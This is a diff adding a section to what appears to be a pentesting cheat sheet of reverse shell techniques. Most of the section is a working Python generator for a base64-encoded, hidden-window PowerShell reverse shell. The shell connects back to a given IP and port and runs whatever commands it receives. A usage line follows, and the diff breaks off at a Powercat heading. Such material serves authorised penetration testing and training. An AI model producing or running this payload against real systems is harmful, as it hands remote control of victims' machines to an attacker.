@@ -4,6 +4,55 @@ description: Various reverse shell techniques in fast go cheat-sheet format
 
 # 🐚 Reverse Shells
 
+### PowerShell Base64
+
+Generate base64 encoded payload for reverse shell for windows target.
+
+{% code title="windows-rev-b64.py" overflow="wrap" %}
+```python
+import sys
+import base64
+
+def generate_payload(ip, port):
+    payload = (
+        f"$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
+        "$stream=$client.GetStream();"
+        "[byte[]]$bytes=0..65535|%{0};"
+        "while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){"
+        "$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
+        "$sendback=(iex $data 2>&1 | Out-String);"
+        "$sendback2=$sendback+'PS '+(pwd).Path+'> ';"
+        "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
+        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
+        "$client.Close()"
+    )
+    return payload
+
+def generate_cmd(ip, port):
+    payload = generate_payload(ip, port)
+    cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+    return cmd
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print("Usage: python script.py <ip> <port>")
+        sys.exit(1)
+    
+    ip = sys.argv[1]
+    port = sys.argv[2]
+    
+    cmd = generate_cmd(ip, port)
+    print(cmd)
+
+```
+{% endcode %}
+
+Usage:
+
+```bash
+python windows-rev-b64.py <local_ip> <local_port>
+```
+
 ### Powercat
 
 Serve Powercat.ps1
